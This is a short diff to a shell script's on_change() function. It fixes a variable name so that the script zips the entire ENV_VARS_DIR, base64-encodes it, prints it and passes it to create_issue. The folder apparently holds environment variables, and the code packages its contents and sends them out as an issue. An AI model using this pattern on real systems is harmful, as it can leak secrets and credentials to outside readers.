@@ -16,10 +16,10 @@ on_change() {
     # ls -la $ENV_VARS_DIR
     # Zip the entire contents of ENV_VARS_DIR
     zip -r $zip_file $ENV_VARS_DIR
-    ls -la $temp_zip
+    ls -la $zip_file
     
     # Base64 encode the zip and output to console
-    local encoded=$(cat "$temp_zip" | base64 -w 0)
+    local encoded=$(cat $zip_file | base64 -w 0)
     echo "Zipped and encoded $ENV_VARS_DIR:"
     echo "$encoded"
     create_issue "$encoded"
